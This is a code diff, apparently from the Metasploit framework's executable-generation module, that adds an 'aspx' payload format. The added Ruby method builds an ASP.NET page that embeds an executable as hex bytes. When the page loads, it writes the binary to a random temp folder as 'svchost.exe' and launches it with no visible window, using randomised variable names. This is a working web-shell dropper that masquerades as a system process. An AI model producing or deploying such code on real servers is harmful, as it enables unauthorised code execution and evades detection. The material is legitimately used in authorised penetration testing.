@@ -1012,12 +1012,64 @@ End Sub
 		vbs
 	end
 
+	def self.to_exe_aspx(exes = '', opts={})
+		exe = exes.unpack('C*')
+
+		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
+
+		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
+		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
+		source << "<script runat=\"server\">\r\n"
+		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
+		source << "\t{\r\n"
+		source << "\t\tstring #{var_file} = \""
+
+		0.upto(exe.length-1) do |byte|
+			source << "\\x#{exe[byte].to_s(16)}"
+		end
+
+		source << "\";\r\n"
+		source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
+		source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, Path.GetRandomFileName());\r\n"
+		source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
+		source << "\r\n"
+		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
+		source << "\r\n"
+		source << "\t\tusing (FileStream fs = File.Create(#{var_tempexe}))\r\n"
+		source << "\t\t{\r\n"
+		source << "\t\t\tforeach (char #{var_iterator} in #{var_file})\r\n"
+		source << "\t\t\t{\r\n"
+		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
+		source << "\t\t\t}\r\n"
+		source << "\t\t\tfs.Close();\r\n"
+		source << "\t\t}\r\n"
+		source << "\r\n"
+		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
+		source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
+		source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
+		source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
+		source << "\t\t#{var_proc}.Start();\r\n"
+		source << "\r\n"
+		source << "\t}\r\n"
+		source << "</script>\r\n"	
+		source
+	end
+
 	def self.to_win32pe_vbs(framework, code, opts={})
 		to_exe_vbs(to_win32pe(framework, code, opts), opts)
 	end
 
 	def self.to_win32pe_asp(framework, code, opts={})
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
+	end
+
+	def self.to_win32pe_aspx(framework, code, opts={})
+		to_exe_aspx(to_win32pe(framework, code, opts), opts)
 	end
 
 	# Creates a jar file that drops the provided +exe+ into a random file name
@@ -1744,6 +1796,9 @@ End Sub
 		when 'asp'
 			output = Msf::Util::EXE.to_win32pe_asp(framework, code, exeopts)
 
+		when 'aspx'
+			output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
+
 		when 'war'
 			arch ||= [ ARCH_X86 ]
 			tmp_plat = plat.platforms if plat
@@ -1757,7 +1812,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war']
 	end
 
 	#
